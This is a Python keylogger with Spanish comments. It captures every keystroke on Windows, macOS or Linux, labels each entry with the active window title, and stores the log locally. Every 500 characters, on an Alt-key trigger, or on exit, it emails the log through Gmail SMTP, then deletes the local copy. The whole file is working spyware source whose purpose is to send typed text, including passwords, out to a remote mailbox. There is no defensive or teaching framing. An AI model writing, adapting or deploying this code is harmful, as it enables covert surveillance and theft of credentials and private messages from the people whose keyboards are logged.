import os
import platform
import sys
import smtplib
from email.message import EmailMessage
from pynput import keyboard

ventana_actual = ""
ARCHIVO_LOG = "registro_actividad.txt"

#Configuraciones de Exfiltración / Correo
EMAIL_REMITENTE = ""
EMAIL_PASSWORD = "La contrasenia" #Contraseña de aplicación
EMAIL_DESTINO = ""
SERVIDOR_SMTP = "smtp.gmail.com"
PUERTO_SMTP = 465

LIMITE_CARACTERES = 500
TECLA_PANICO = keyboard.Key.alt #Tecla para enviar al correo
contador_caracteres = 0


def obtener_ventana_universal():
    sistema = platform.system()
    
    if sistema == "Windows":
        import pygetwindow as gw
        try:
            ventana = gw.getActiveWindow()
            return ventana.title if ventana else "Escritorio/Desconocido"
        except Exception:
            return "Escritorio/Desconocido"
            
    elif sistema == "Darwin":  # macOS
        script = 'tell application "System Events" to get name of (first process whose frontmost is true)'
        return os.popen(f"osascript -e '{script}'").read().strip()
        
    elif sistema == "Linux":
        try:
            return os.popen("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | cut -d '\"' -f 2").read().strip()
        except Exception:
            return "Linux-Window"
            
    return "Sistema desconocido"

def guardar_log(texto):
    if texto:
        with open(ARCHIVO_LOG, "a", encoding="utf-8") as f:
            f.write(texto)

def enviar_correo():
    global contador_caracteres
    
    if not os.path.exists(ARCHIVO_LOG) or os.path.getsize(ARCHIVO_LOG) == 0:
        return

    try:
        with open(ARCHIVO_LOG, "r", encoding="utf-8") as f:
            contenido = f.read()

        #Configurar el mensaje
        msg = EmailMessage()
        msg['Subject'] = 'Reporte de Actividad del Teclado'
        msg['From'] = EMAIL_REMITENTE
        msg['To'] = EMAIL_DESTINO
        msg.set_content(contenido)

        #Enviar el correo usando SMTP_SSL
        with smtplib.SMTP_SSL(SERVIDOR_SMTP, PUERTO_SMTP) as server:
            server.login(EMAIL_REMITENTE, EMAIL_PASSWORD)
            server.send_message(msg)
            
        print("\n\n[+] Reporte enviado exitosamente al correo.")
        
        #Limpiar el log local y reiniciar el contador
        with open(ARCHIVO_LOG, "w", encoding="utf-8") as f:
            f.write("")
        contador_caracteres = 0

    except Exception as e:
        print(f"\n\n[-] Error al enviar el correo: {e}")


#Manejadores de eventos de teclado
def al_presionar(tecla):
    global ventana_actual, contador_caracteres
    texto_a_guardar = ""
    
    nueva_ventana = obtener_ventana_universal()
    if nueva_ventana != ventana_actual:
        ventana_actual = nueva_ventana
        encabezado = f"\n\nAPLICACION: {ventana_actual}\n{'-' * 30}\n"
        print(encabezado, end="")
        texto_a_guardar += encabezado
    
    try:
        caracter = tecla.char
        print(caracter, end="", flush=True)
        texto_a_guardar += caracter
    except AttributeError:
        if tecla == keyboard.Key.space:
            print(" ", end="", flush=True)
            texto_a_guardar += " "
        elif tecla == keyboard.Key.enter:
            print("\n", end="", flush=True)
            texto_a_guardar += "\n"
        elif tecla == keyboard.Key.backspace:
            print("<-", end="", flush=True)
            texto_a_guardar += "<-"
        else:
            tecla_especial = f"[{tecla.name}]"
            print(tecla_especial, end="", flush=True)
            texto_a_guardar += tecla_especial

    #Guardar en el archivo local
    guardar_log(texto_a_guardar)
    
    contador_caracteres += len(texto_a_guardar)
    if contador_caracteres >= LIMITE_CARACTERES:
        enviar_correo()

def al_soltar(tecla):
    if tecla == keyboard.Key.esc:
        mensaje_salida = "\n\n--- Finalizando monitor ---\n"
        print(mensaje_salida)
        guardar_log(mensaje_salida)
        if contador_caracteres > 0:
            enviar_correo()
        return False
        
    elif tecla in (keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr):
        print("\n\n[!] TECLA DE PÁNICO DETECTADA. Forzando envío de correo...")
        enviar_correo()


#Inicialización del Listener y ciclo principal
mensaje_inicio = ">>> INICIALIZANDO GANCHO (HOOK)...\n"
print(mensaje_inicio, end="", flush=True)
guardar_log(mensaje_inicio)

escuchador = keyboard.Listener(on_press=al_presionar, on_release=al_soltar, suppress=True)

mensaje_corriendo = f">>> KEYBOARD CORRIENDO.\n>>> (Envío automático cada {LIMITE_CARACTERES} caracteres | {TECLA_PANICO} para envío manual | ESC para salir)\n"
print(mensaje_corriendo, end="", flush=True)
guardar_log(mensaje_corriendo)

try:
    with escuchador:
        escuchador.join()
except KeyboardInterrupt:
    mensaje_interrupcion = "\n>>> KEYLOGGER DETENIDO POR EL USUARIO.\n"
    print(mensaje_interrupcion)
    guardar_log(mensaje_interrupcion)
    if contador_caracteres > 0:
        enviar_correo()